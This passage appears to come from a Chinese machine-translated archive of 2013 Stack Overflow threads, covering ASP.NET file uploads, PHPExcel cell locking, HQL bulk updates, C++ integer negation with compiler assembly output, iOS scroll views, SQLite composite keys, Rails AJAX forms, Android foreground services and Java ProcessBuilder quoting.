    Dim lExpId As String = context.Request.Headers("ExpedienteID")
    Dim fLenght As Integer

    If (context.Request.Files.Count > 0) Then
        Dim files As HttpFileCollection = context.Request.Files

        For i = 0 To files.Count - 1
            fLenght = files(i).ContentLength
            documentBytes = New Byte(fLenght - 1) {}
            context.Request.InputStream.Read(documentBytes, 0, fLenght)
            UploadDocumentBy_ExpID(documentBytes, files(i).FileName, "Description" & lExpId.ToString, lExpId)
        Next
    End If
End Sub 
```

更晚了，我尝试将此 byte() 放在网格上的图像标记中。

**asp代码：**

```
<asp:GridView ID="grdDocumentoByExp" runat="server" AutoGenerateColumns="false" Width="250px" DataSourceID="dtsDocumentByExpId">
<Columns>
    <asp:BoundField DataField="Archivo" HeaderText="Archivo" />
    <asp:BoundField DataField="docId" HeaderText="docId" />
    <asp:BoundField DataField="Documento" HeaderText="Documento" Visible="false" />
    <asp:TemplateField HeaderText="Preview">
        <ItemTemplate>
           <asp:Image 
               ID="imgThumb" 
               runat="server"
               ImageUrl='<%# GetImage(Eval("Documento")) %>'
               />
        </ItemTemplate>
    </asp:TemplateField>

</Columns> 
```

**以及代码隐藏中的函数 GetImage：**

```
 Public Function GetImage(image As Object) As String
    Return "data:image/gif;base64," & Convert.ToBase64String(DirectCast(image, [Byte]()))
End Function 
```

在所有步骤中，都没有错误，但我认为错误可能位于 byte() 文件格式中。但我不确定。

谁来帮帮我？

对不起我的英语和谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:06:26.453

问题在于您如何阅读文件：

```
context.Request.InputStream.Read(documentBytes, 0, fLenght) 
```

该`Read`方法返回读取的字节数，可以小于您请求的字节数。您必须循环直到获得所有字节：

```
Dim offset as Integer = 0
Dim len as Integer
Do While offset < fLength
  len = context.Request.InputStream.Read(documentBytes, offset, fLenght - offset)
  offset += len
Loop 
```

# php - 如何在 php 中使用 PHPExcel 交替无法/禁用 Excel 工作表字段

> ID：15111443
> 
> 赞同：1
> 
> 时间：2013-02-27T11:52:55.773
> 
> 标签：php, phpexcel

这就是我试图使用 PHPExcel 无法/禁用我的 Excel 工作表中的某些单元格的方式，但它不能以这种方式工作……工作表完全锁定或完全可写。

我的代码 -

```
$objPHPExcel = new PHPExcel();

$objPHPExcel->getProperties()->setCreator("Swapnesh Sinha")
                             ->setLastModifiedBy("Swapnesh Sinha")
                             ->setTitle("Office 2007 XLSX Student Grid Document")
                             ->setSubject("Office 2007 XLSX Student Grid Document")
                             ->setDescription("Student document for Office 2007 XLSX, generated using PHP classes.")
                             ->setKeywords("office 2007 openxml php")
                             ->setCategory("Student Data");

$objPHPExcel->getActiveSheet()->getProtection()->setSheet(true); 
$objPHPExcel->getActiveSheet()->getProtection()->setFormatCells(true);
$objPHPExcel->getActiveSheet()->setCellValue('A1', 'Swapnesh');
$objPHPExcel->getActiveSheet()->setCellValue('B1', 'Vikas');

$objPHPExcel->getActiveSheet()->getProtection()->setSheet(false); 
$objPHPExcel->getActiveSheet()->getProtection()->setFormatCells(false);
$objPHPExcel->getActiveSheet()->setCellValue('C1', 'Sachin');
$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
$filename = "Student-data-sheet".".xlsx";
$objWriter->save($filename); 
```

我正在尝试不修改 Swapnesh/Vikas 内容，但可以相应地修改 Sachin。

> // 这应该启用以启用以下任何一项！$objPHPExcel->getActiveSheet()->getProtection()->setSheet(true);

我正在使用它，但无法做到......让我知道如何解决它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:05:34.327

```
$objPHPExcel->getActiveSheet()
    ->getStyle('A1:B1')
    ->getProtection()->setLocked(
        PHPExcel_Style_Protection::PROTECTION_PROTECTED
    ); 
```

**编辑**

```
// Set the entire worksheet to locked
$objPHPExcel->getActiveSheet()->getProtection()->setSheet(true);
// Unprotect those cells that you want to make editable
$objPHPExcel->getActiveSheet()
    ->getStyle('A2:B2')
    ->getProtection()->setLocked(
        PHPExcel_Style_Protection::PROTECTION_UNPROTECTED
    ); 
```

之后不要重置工作表级别的更改

# mysql - Hibernate Hql 使用两个实体表进行批量更新

> ID：15111451
> 
> 赞同：1
> 
> 时间：2013-02-27T11:53:22.010
> 
> 标签：mysql, database, hibernate, hql

我在 mysql 中使用此查询来更新 in 的多个值，并在特定条件下使用`column2`in 中`Table1`的值。但我无法在休眠更新 hql 中给出两个实体名称。我能知道我必须如何在 hql 中编写下面的查询，以便它支持所有数据库。`column2``Table2`

```
UPDATE Table1 A, Table2 B SET A.column2 = B.column2 WHERE A.column1 = B.column1 
```

谢谢，赛义夫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T21:23:11.590

从[Hibernate 4.1.9 手册 - 关于批量更新和删除的部分](http://docs.jboss.org/hibernate/orm/4.1/manual/en-US/html_single/#batch-direct)：

> 不能在批量 HQL 查询中指定隐式或显式连接。子查询可以在 where 子句中使用，其中子查询本身可能包含连接。

不支持（隐式连接）：

```
DELETE A a WHERE a.relation.property = "dummy"; 
```

一个方法：

```
DELETE A a WHERE a.relation.id IN (SELECT r.id FROM Relation r WHERE r.property = "dummy"); 
```

对于您的示例，它有点复杂，但以下查询应该可以工作（在 HSQL db 中测试）：

```
UPDATE A a SET a.column3 = (SELECT b.column3 FROM B b WHERE a.column1 = b.column1 and a.column2 = b.column2) WHERE a.id IN (SELECT a.id FROM A a, B b WHERE a.column1 = b.column1 AND a.column2 = b.column2) 
```

此查询在 HSQL db 中有效，但在 MySQL 中失败。看起来唯一可能的解决方案是使用两个单独的查询：

```
List<String> list = em.createQuery("SELECT a.column1 FROM A a, B b WHERE a.column1 = b.column1 AND a.column2 = b.column2").getResultList();
em.createQuery("UPDATE A a SET a.column3 = (SELECT b.column3 FROM B b WHERE a.column1 = b.column1 and a.column2 = b.column2) WHERE a.column1 IN :list").setParameter("list", list).executeUpdate(); 
```

最后一个解决方案在 mysql 中进行了测试并且运行良好，但在您的情况下，您必须根据您的用例自定义第一个选择查询 - 我的示例期望 a.column1 是唯一的（使用 column1 而不是 id 来避免主键）。

# c++ - 否定一个数字的最快方法

> ID：15111466
> 
> 赞同：43
> 
> 时间：2013-02-27T11:54:00.850
> 
> 标签：c++, visual-c++, x86, micro-optimization, visual-c++-2012

我今天早上在这里想，将多个正面反转为负面以及从负面反转为正面的最快方法是什么，当然，最简单的方法可能是：

```
int a = 10;
a = a*(-1); 
```

或者

```
int a = 10;
a = -a; 
```

但后来，我想，我会这样做，使用命令移位和指针......这真的有可能改变一个值的符号，使用命令移位运算符和内存？

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2013-02-27T11:56:08.743

使用可读的东西，例如

```
a *= -1; 
```

或者

```
a = -a; 
```

剩下的留给优化器。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2013-02-27T12:03:00.447

在禁用优化的情况下，gcc for x86 将第一个编译成这个 asm：

```
 .file   "optimum.c"
    .def    ___main;    .scl    2;  .type   32; .endef
    .text
.globl _main
    .def    _main;  .scl    2;  .type   32; .endef
_main:
    pushl   %ebp
    movl    %esp, %ebp
    andl    $-16, %esp
    subl    $16, %esp
    call    ___main               # MinGW library init function
    movl    $10, 12(%esp) ;i = 10
    negl    12(%esp)      ;i = -i
    movl    $0, %eax
    leave
    ret 
```

禁用优化后，第二个会产生：

```
 .file   "optimum.c"
    .def    ___main;    .scl    2;  .type   32; .endef
    .text
.globl _main
    .def    _main;  .scl    2;  .type   32; .endef
_main:
    pushl   %ebp
    movl    %esp, %ebp
    andl    $-16, %esp
    subl    $16, %esp
    call    ___main
    movl    $10, 12(%esp)   ;i = 10
    negl    12(%esp)        ;i = -i
    movl    $0, %eax
    leave
    ret 
```

一样的输出！生成的汇编代码没有区别。

-------------------------- 编辑，他使用 VC++2012 的 OP ANSWERS，INTEL ARCH----------- --------

编译使用`cl optimum.c /Fa optimum.asm`（优化禁用）

```
; Listing generated by Microsoft (R) Optimizing Compiler Version 16.00.30319.01 

    TITLE   C:\Users\Dell\Downloads\TTH\TTH\TTH\optimum.c
    .686P
    .XMM
    include listing.inc
    .model  flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC  _main
; Function compile flags: /Odtp
_TEXT   SEGMENT
_a$ = -4                        ; size = 4
_argc$ = 8                      ; size = 4
_argv$ = 12                     ; size = 4
_main   PROC
; File c:\users\dell\downloads\tth\tth\tth\optimum.c
; Line 4
    push    ebp
    mov ebp, esp
    push    ecx
; Line 5
    mov DWORD PTR _a$[ebp], 10          ; 0000000aH
; Line 6
    mov eax, DWORD PTR _a$[ebp]
    neg eax ;1 machine cycle!
    mov DWORD PTR _a$[ebp], eax
; Line 7
    xor eax, eax
; Line 8
    mov esp, ebp
    pop ebp
    ret 0
_main   ENDP
_TEXT   ENDS
END 
```

使用第二种方法 ( `a = a * -1`)，优化禁用 MSVC：

```
; Listing generated by Microsoft (R) Optimizing Compiler Version 16.00.30319.01 

    TITLE   C:\Users\Dell\Downloads\TTH\TTH\TTH\optimum.c
    .686P
    .XMM
    include listing.inc
    .model  flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC  _main
; Function compile flags: /Odtp
_TEXT   SEGMENT
_a$ = -4                        ; size = 4
_argc$ = 8                      ; size = 4
_argv$ = 12                     ; size = 4
_main   PROC
; File c:\users\dell\downloads\tth\tth\tth\optimum.c
; Line 4
    push    ebp
    mov ebp, esp
    push    ecx
; Line 5
    mov DWORD PTR _a$[ebp], 10          ; 0000000aH
; Line 6
    mov eax, DWORD PTR _a$[ebp]
    imul    eax, -1 ;1 instruction, 3 machine/cycles :|
    mov DWORD PTR _a$[ebp], eax
; Line 7
    xor eax, eax
; Line 8
    mov esp, ebp
    pop ebp
    ret 0
_main   ENDP
_TEXT   ENDS
END 
```

因此，如果您关心 MSVC 下调试模式 asm 的性能，您可以相应地优化您的源代码。通常你只关心优化构建的性能。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2015-05-27T15:12:02.177

其他答案正确地表明可读性更重要：

*   您应该忘记速度并选择您认为最易读的成语。
*   几乎所有编译器（启用了优化）都会为类似的任何东西生成等效的最佳代码（可能是一条指令）`a = -a`，`a *= -1`等等^(。1)
*   任何让它更快的尝试都会使它的可读性大大降低，并且很容易让它变慢。
*   如果您需要优化，您应该从分析生成的代码和性能开始。

然而，这个习语 有一个**实际的优势**`*= -1`：你只需要在左边写一次，它只被评估一次——读者只需要读一次！当 LHS 较长、复杂或昂贵或可能有副作用时，这是相关的：

```
(valid ? a : b)[prime_after(i++)] *= -1;
*look_up (input) *= -1;  // Where look_up may have side-effects
parity[state][(unsigned int)getc(stdin)] *= -1;
variable_with_a_long_explanatory_name *= -1; 
```

一旦一个人采用了一种习语，人们往往会在其他情况下坚持使用它。

* * *

¹ [*[Peter Cordes](https://stackoverflow.com/users/224132/peter-cordes)*][*的观察*：几乎所有编译器都理解这一点`a = -a`，并且`a *= -1`完全相同，并且无论您如何编写它，都会发出他们认为在目标 CPU 上最有效的任何 asm。（例如，用于 x86 gcc/MSVC/clang 和 ARM gcc 的[Godbolt 编译器资源管理器](https://gcc.godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(j:1,source:'int+neg(int+a)+%7B+return+-a%3B+%7D%0A%0Aint+mul(int+a)+%7B+return+a+*+-1%3B%7D%0A%0A//+has+the+interesting+property+that+calling+it+on+INT_MIN%0A//+is+not+UB+because+it!'s+not+a+signed+overflow.%0A//+but+it+only+works+on+2!'s+complement+implementations.%0Aint+neg_2s_complement+(int+a)+%7B%0A++++unsigned+ua+%3D+a%3B%0A++++return+~(a-1)%3B%0A%7D%0A'),l:'5',n:'0',o:'C%2B%2B+source+%231',t:'0')),k:36.129119394921666,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((g:!((h:compiler,i:(compiler:g72,filters:(b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'0',trim:'1'),libs:!(),options:'-std%3Dgnu%2B%2B11+-Wall+-O3+-mtune%3Dsandybridge',source:1),l:'5',n:'0',o:'x86-64+gcc+7.2+(Editor+%231,+Compiler+%231)',t:'0')),k:29.6056185845489,l:'4',m:50,n:'0',o:'',s:0,t:'0'),(g:!((h:compiler,i:(compiler:cl19_64,filters:(b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'0',trim:'1'),libs:!(),options:/Ox,source:1),l:'5',n:'0',o:'x86-64+MSVC+19+2017+RTW+(Editor+%231,+Compiler+%233)',t:'0')),header:(),l:'4',m:50,n:'0',o:'',s:0,t:'0')),k:32.25986788974475,l:'3',n:'0',o:'',t:'0'),(g:!((g:!((h:compiler,i:(compiler:clang500,filters:(b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'0',trim:'1'),libs:!(),options:'-std%3Dgnu%2B%2B11+-Wall+-O3',source:1),l:'5',n:'0',o:'x86-64+clang+5.0.0+(Editor+%231,+Compiler+%232)',t:'0')),k:31.611012715333594,l:'4',m:50,n:'0',o:'',s:0,t:'0'),(g:!((h:compiler,i:(compiler:armg630,filters:(b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'0',trim:'1'),libs:!(),options:'-Wall+-O3',source:1),l:'5',n:'0',o:'ARM+gcc+6.3.0+(linux)+(Editor+%231,+Compiler+%234)',t:'0')),header:(),l:'4',m:50,n:'0',o:'',s:0,t:'0')),k:31.611012715333594,l:'3',n:'0',o:'',t:'0')),l:'2',n:'0',o:'',t:'0')),version:4)] [。）但尽管 MSVS 2012（仅在调试模式下）对每个指令使用一条指令，但在最近的 Intel CPU 上，它们需要 1 个周期`= -a`和 3个周期`*= -1`，使用实际`imul`操作说明。]

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-02-28T17:57:16.200

也是 0 - n

Gcc 为所有四种情况发出“否定”指令：-n、0 - n、n * -1 和 ~n + 1

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-02-27T12:03:57.937

假设处理器至少有一定的能力并且具有`sizeof(int) == sizeof(Cpu_register)`，那么“使这个数字为负”将是一条指令（通常称为`neg`）[嗯，可能也需要加载和存储值，但是如果您将变量用于其他任何事情，它可以在加载后保留，并且只能在以后存储......]

乘以`-1`很可能比 慢`a = -a;`，但大多数有能力的编译器应该能够使这两者等效。

所以，只要把代码写清楚，剩下的就自己处理好了。在大多数处理器中，取反一个数字并不是什么困难的操作。如果你使用了一些不寻常的处理器，那么看看编译器的输出，看看它做了什么。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-11-09T03:19:28.840

> 使用高级语言的解决方案

像这样的问题在面试和竞争激烈的编程世界中很流行。

我来到这里研究更多不使用 - 或 + 运算符的否定数字解决方案。

为了这 ：

1.  使用 ~ 运算符补数
2.  然后使用半加法器逻辑将步骤 1 中获得的数字加 1：

> ```
> > int addNumbers(int x, int y)
> >       {
> >                    if(y==0)  return x; // carry is 0 
> >                    return addNumbers(x^y,(x&y)<<1);
> >         } 
> ```

这里 x^y 执行位相加， x&y 处理进位操作

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-02-27T12:02:14.497

你可以试试

```
int a = 10;
a= ~a+1; 
```

但你不应该担心这一点，因为编译器以最好的方式使它成为可能。

# iphone - UIScroll：即使在滚动时也启用触摸事件

> ID：15111474
> 
> 赞同：2
> 
> 时间：2013-02-27T11:54:49.920
> 
> 标签：iphone, ios, uiscrollview

我应该如何配置我的 UIScrollView，以便`forControlEvents:UIControlStateHighlighted` 当 scrollView 处于滚动状态时仍然可以触发 UIbutton。

现在它只是在触摸时停止滚动，而不是突出显示按钮，即使手指落在它上面也是如此。

当然，这是非常值得期待的，但如果有人可以指导我在滚动时启用按钮的触摸事件，我会非常感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T13:38:13.530

好吧，您可以尝试继承 UIScrollView 并覆盖 hitTest 方法，如下所示：

```
-(id)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
    id hitView = [super hitTest:point withEvent:event];
    if (hitView == yourButton) {
        return yourButton;
    } else { 
       return hitView;
    }
} 
```

这样，当您的按钮被“点击”时，该按钮将接收触摸事件而不是 UIScrollView。

# android - 在 sq lite db 中有多个主键

> ID：15111479
> 
> 赞同：-3
> 
> 时间：2013-02-27T11:54:57.837
> 
> 标签：android, sqlite

我正在尝试开发 android 应用程序来将一些数据存储到 sqlite db。因为我在下面的代码中使用过，我的问题是我想要三列作为主键。但我不知道如何使用这些代码来做到这一点。

```
@Override
public void onCreate(SQLiteDatabase db) {
    db.execSQL("CREATE TABLE " + DATABASE_TABLE + " (" +
            KEY_DATE + " TEXT NOT NULL, " +
            KEY_PCODE + " TEXT NOT NULL , "+
            KEY_STATE + " TEXT NOT NULL , "+
            KEY_COUNT + " TEXT); "
    );
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:57:57.890

语法是这样的：

```
CREATE TABLE yourTable (column1 TEXT NOT NULL, 
  column2 TEXT NOT NULL, 
  column3 TEXT NOT NULL, 
  PRIMARY KEY (column1, column2)); 
```

# apache - Hive / Hadoop：监控正在运行的进程

> ID：15111505
> 
> 赞同：0
> 
> 时间：2013-02-27T11:56:12.820
> 
> 标签：apache, hadoop, hive

是否有监控正在运行的 Hive 进程并确保它们确实在并行工作？

我已经设置了一个实验性的 Linux 集群（4 台机器），并想了解底层流程。

top 和 ps 不要给我太多信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:39:07.853

Hive 查询分为几个 MR，称为 sql_text-stage 1、sql_text-stage-2 等。您可以在 job_tracker_adress:50030
上输入集群的 JobTracker Web UI 的 UI，在 那里您将看到 Hive 作业及其进度。 对于每个作业，都会有一个任务列表，对于每个任务，您可以看到它们在哪些节点上运行，以及它们的基本统计信息

# jquery - Rails 提交包含 ajax 加载部分的表单

> ID：15111506
> 
> 赞同：0
> 
> 时间：2013-02-27T11:56:15.680
> 
> 标签：jquery, ruby-on-rails, ajax, ajaxform

在 Rails 3.2 中，我正在尝试提交一个表单，该表单具有一个先前使用 ajax 添加到此表单的选择字段。像这样：

1.  第一个表单 (has `:remote => true`) 以 js.erb 响应，它（除其他外）在另一个表单中呈现一个选择字段，如下所示（选择字段在部分中）：

    ```
    $('#target_variables_div').html("<%= j render(:partial => 'logged_data/select_vars', :locals => { :vars => @vars, :date => @date }) %>") 
    ```

2.  这个“另一个”表单（也有`:remote => true`）有更多的表单字段，但是这些是在页面加载时静态加载的。

问题是当我提交这个“另一个”表单时，它只发送静态参数，不包括先前加载部分的选择字段。

我知道它与 jQuery 有关`live`，或者`on`我仍然无法提交完整的表单......

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:05:27.980

Jquery`live`和`on`方法用于侦听`dom`页面上新添加的元素，例如第一次加载时不存在但动态添加的按钮，并且需要附加一个事件，例如：

```
$('#dinamyc_button').on('click', function() {}); 
```

在您的情况下，我相信您将不得不手动设置选择值。尝试为您的表单创建一个侦听器，在提交时会将选择值附加到您的数据以传递给服务器：

```
$('#your_form').submit(function() {
  var formData = $(this).serialize();
  var selectValue = $('#your_select').val();
  formData['select'] = selectValue; // or formData.select = selectValue;
  $.ajax({
    type: 'POST',
    url: whatever,
    data: formData
  })
}); 
```

这只是一个不完善的例子，但你明白了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T13:32:47.597

多亏了 MurifoX，我终于设法完全提交了表单。以前我在加载 DOM 后运行提交块（`jquery ->`在我的 CoffeeScript 文件中的块内）。结果 CoffeeScript 是：

```
$('#generate-button').on "click", (e) ->
  e.preventDefault()
  formData = $(this).parents("form").serialize()
  selectValue = $('#select_vars_field').val()
  $.ajax
    type: 'POST',
    url: '/logged_data/get_chart',
    data: formData + "&vars=" + selectValue 
```

# asp.net - ASP.net MVC 4 动态视图、事件和验证

> ID：15111512
> 
> 赞同：0
> 
> 时间：2013-02-27T11:56:30.587
> 
> 标签：asp.net, asp.net-mvc

我们正在构建一个大型 ASP.net MVC 4 网站，其中一个问卷模块需要动态构建视图。

我们正在尝试解决 3 个问题： - 使用数据库中的数据（控件名称、值）生成视图 - 对生成的控件有事件（例如：radiobuttion 需要有一个更改事件并需要相应地启用/禁用项目） -验证控件（可能是客户端验证）

做到这一点的最佳方法是什么？我们考虑过使用 Html 助手和编辑器模板生成视图。其他浮动选项是使用动态模型和自定义模型绑定器。

当我们通过 POC 进行尝试时，任何解决上述问题的想法和解决方案都会有所帮助。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:20:07.387

这是 Brad Wilson 的精彩网络广播：[Advanced MVC 3](http://bradwilson.typepad.com/blog/2011/02/advanced-aspnet-mvc-3-presentation.html)。还要检查此演示文稿的来源。您将对 NonClassModels 部分感兴趣。它展示了如何围绕字典类型连接所有框架部分。验证、编辑等

希望这会有所帮助。

# objective-c - 移动 UIScrollView 使 UIButton 完全显示

> ID：15111513
> 
> 赞同：0
> 
> 时间：2013-02-27T11:56:41.307
> 
> 标签：objective-c, uiscrollview, uibutton

我在 UIScrollView 内放置了 6 个 UIButton 控件。这些按钮是水平对齐的，但一次只能看到 3.5 个按钮。

我想要发生的是当我触摸半可见按钮时 - UIScrollView 移动其内容，以便触摸按钮完全可见（就像过滤器栏在 Instagram 中的工作方式一样）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:05:39.387

```
- (IBAction)buttonPressed:(id)sender{
      [scrollView scrollRectToVisible:sender.frame animated:YES];
      //your code
} 
```

向按钮添加动作。

# android - 在将 startForeground() 添加到服务时，会创建两个通知而不是一个

> ID：15111516
> 
> 赞同：0
> 
> 时间：2013-02-27T11:56:55.557
> 
> 标签：android, service, notifications

所以我创建了一个服务，它工作得很好。它所做的只是计数。我有一个自定义类来处理使用通知的麻烦。这个类有一个 getNotification ，显然它返回它使用的通知。一切都很好，但我必须让我的服务在前台运行（它将一些重要数据同步到应用程序，在完成之前不得中断）现在当我添加 startForeground 我添加我的通知和一个 id就这样。开始前景（1337，通知）；

我遇到的问题是，由于某种原因，我所做的第一个 notify() 独立于其他通知。因此，当我进行此运行时，它会创建两个通知。第一个卡在第一个更新上，标题为“Zilean”，内容为“计数”。另一个完美更新。我注意到如果 startForeground 以 0 的 id (startForeground(0,notification)) 运行，那么这个问题就会得到解决，但如果我终止活动，通知就会消失。当 id <> 0 时不会发生。

我有这个问题太久了，所以我使用了一个只重要的虚拟服务。我想知道，如果活动因用户而死，或者只是因为 android 决定删除它的记忆，那么服务将继续运行。

```
// onStartCommand
@Override
public int onStartCommand(Intent intent, int flags, int startId) {

    // NOTIFICATION SECTION
    NotificationManager mNotifyManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

    NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(
            this);

    notificationManagerClass = new SBNNotification(mNotifyManager,
            mBuilder, true, 1, false, "Zilean",
            "Initiating Counter", false);
    notificationManagerClass.notificate();

        final Notification notification = notificationManagerClass.getNotification();
    notification.flags = flags;
    notification.defaults = Notification.DEFAULT_LIGHTS;

    startForeground(1337, notification);

    new Timer().scheduleAtFixedRate(new TimerTask () {
        int i=0;
        @Override
        public void run() {

            notificationManagerClass.setContentTitle("Contando");
            notificationManagerClass.setContentText(String.valueOf(i));
            notificationManagerClass.notificate();
            i++;
            Log.e("HOLAAA", String.valueOf(i));
        }}, 0, 1000);

    return START_REDELIVER_INTENT;
} 
```

所以..我错过了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-28T13:56:35.777

已解决，我的错误是通知 id 与我传递的 startForeground id 不同（1337）

编辑：重要的是要注意通知 id 和服务 id 不能为 0，否则它将与主活动线程混合

# java - 具有多个带空格的参数的 Java ProcessBuilder

> ID：15111517
> 
> 赞同：3
> 
> 时间：2013-02-27T11:57:01.423
> 
> 标签：java, parameters, cmd, space, processbuilder

我知道有很多关于从 java 执行进程的已解决问题。但是我无法使用提供的答案来解决我的问题。我正在尝试从 java 应用程序创建 postgresql 数据库备份。我使用以下代码

```
 //ProcessBuilder probuilder = new ProcessBuilder(new String[]{"cmd","/c","D:/PostgreSQL 8.2/bin/pg_dump.exe","-U","usr","-i","-h","localhost","-p","5432","-F","c","-b","-f","D:/backup test/backups/test_27-1-2013_210.backup", "test"});
        //ProcessBuilder probuilder = new ProcessBuilder(new String[]{"cmd","/c","D:\\PostgreSQL 8.2\\bin\\pg_dump.exe","-U","usr","-i","-h","localhost","-p","5432","-F","c","-b","-f","D:\\backup test\\backups\\test_27-1-2013_210.backup", "test"});
        ProcessBuilder probuilder = new ProcessBuilder(new String[]{"cmd","/c","\"D:\\PostgreSQL 8.2\\bin\\pg_dump.exe\"","-U","usr","-i","-h","localhost","-p","5432","-F","c","-b","-f","\"D:\\backup test\\backups\\test_27-1-2013_210.backup\"", "test"});
        Map<String, String> env = probuilder.environment();
        env.put("PGPASSWORD", "mypass");

        final Process process = probuilder.start(); 
```

执行上述代码后，出现以下错误： `D:\PostgreSQL' is not recognized as an internal or external command, operable program or batch file.`

仅当备份文件的路径包含空格时才会出现问题，否则会创建备份。我尝试在文件路径中同时使用斜杠和反斜杠，并引用了文件路径，但每次都会遇到相同的错误。可以从命令提示符执行命令。

我做错了什么。ProcessBuilder 中带有空格的参数数量是否存在一些限制。谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T12:00:06.833

因为`pg_dump.exe`它是一个 exe（不是 .bat），所以你根本不需要`cmd`它，它可能导致的问题多于它解决的问题。只需`exe`直接调用，并删除文件路径周围的额外引号：

```
new String[]{"D:\\PostgreSQL 8.2\\bin\\pg_dump.exe","-U","usr","-i",
  "-h","localhost","-p","5432","-F","c","-b",
  "-f","D:\\backup test\\backups\\test_27-1-2013_210.backup", "test"} 
```

# c# - 了解要维护的项目流程

> ID：15111521
> 
> 赞同：-1
> 
> 时间：2013-02-27T11:57:14.710
> 
> 标签：c#, xaml, workflow, project, windows-store-apps

我作为一名新生（实习生）加入了软件公司，负责 Windows 应用商店的开发。我对 C# 了解不多。我公司刚开始Windows Store开发。他们以前没有点网开发。这就是为什么我公司有一个高级点网员工来完成这个项目，当他完成这个项目时，他就离开了公司。
我的问题是我必须在他之后维护项目。我的问题**是如何管理 C# 项目**。如果有任何问题，如何维护项目。**我只是想了解项目流程并分析我的项目以在将来调试项目错误。**但我正在努力如何开始分析项目

不要忽视或关闭这个问题。我不是在问我的个人问题。请回答我如何**开始学习和构建关于流程的项目。** 我可以接受任何建议和任何有关此的帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:02:45.310

如果您想学习 Windows 商店应用程序，那么[This](http://msdn.microsoft.com/en-in/library/windows/apps/hh974581.aspx)和[This](http://www.codeproject.com/Articles/472009/Creating-Windows-Store-app-Beginners-tutorial)链接将帮助您入门

学习 XAML 或任何为您创建 XAML 的工具（如表达式混合）很重要。因为维护更改将更多地在 UI 方面。

# asp.net - 带有嵌套列表视图（具有动态项目）的动态 TabPanels asp.net

> ID：15111524
> 
> 赞同：1
> 
> 时间：2013-02-27T11:57:26.187
> 
> 标签：asp.net, ajax, webforms, tabcontrol

我有 TabControl(AjaxToolKit) 有 2 个嵌套的 ListViews。

代码：

```
 <asp:ScriptManager ID="ScriptManager1" runat="server">
    </asp:ScriptManager>
    <asp:TabContainer ID="tcQuestions" runat="server" ActiveTabIndex="0"    OnDemand="true" AutoPostBack="false" TabStripPlacement="Top" ScrollBars="None" UseVerticalStripPlacement="false">
        <asp:TabPanel ID="tpFirst" runat="server" HeaderText="Page 1" Enabled="true" ScrollBars="Auto"
            OnDemandMode="Once">
            <ContentTemplate>
                <asp:Panel ID="pnlNoData" runat="server">
                    <asp:LinkButton ID="lbQuestionsAdd" Text="Add Question" runat="server" />    
                </asp:Panel>

                <asp:Panel ID="pnlListView" runat="server">
                    <asp:ListView ID="lsvQuestions" runat="server" ItemPlaceholderID="phItemPlaceHoler">
                        <EmptyDataTemplate>
                            <em>NO RECORD WAS FOUND</em>                            
                       </EmptyDataTemplate>
                       <ItemTemplate>
                            <tr>
                                <td>
                                    <asp:Label ID="lblQuestionID" Text='<%#Eval("intQuesId") %>' Visible="false" runat="server" />
                                    <asp:Label ID="lblQuestionTitle" Text='<%#Eval("strQuesTitle") %>' runat="server" />
                                    <%--1.Are you doing job?--%>
                                </td>
                            </tr>
                            <%--Inner Listview--%>
                            <asp:ListView ID="lsvAnswers" runat="server" ItemPlaceholderID="phItemPlaceHolerAnswers">
                                <LayoutTemplate>
                                    <table runat="server" id="table1">
                                        <tr runat="server" id="phItemPlaceHolerAnswers">
                                        </tr>
                                    </table>
                                </LayoutTemplate>
                                <ItemTemplate>
                                    <tr>
                                        <td>
                                            <asp:PlaceHolder ID="plControl" runat="server" />
                                        </td>
                                    </tr>
                                </ItemTemplate>
                                <EmptyDataTemplate>
                                    <em>NO RECORD WAS FOUND</em>
                                </EmptyDataTemplate>
                            </asp:ListView>                            
                       </ItemTemplate>
                       <LayoutTemplate>
                            <table class="tblAll">
                                <tbody>
                                    <tr>
                                        <td style="width: 125px">
                                            <asp:LinkButton ID="lbtnAddQuestions" runat="server">Add Questions</asp:LinkButton>
                                        </td>
                                        <td style="width: 316px">
                                            <asp:LinkButton ID="lbtnDesignTools" runat="server">Design Tools</asp:LinkButton>
                                        </td>
                                        <td class="formTopLinks">
                                            <img class="imgicons" src="../Layout/images/edit.png" />
                                            <asp:LinkButton ID="lbEditProperties" runat="server" CssClass="lnkbuttonText">Edit Properties</asp:LinkButton>
                                        </td>
                                        <td class="formTopLinks">
                                            <img class="imgicons" src="../Layout/images/Delete.png" />
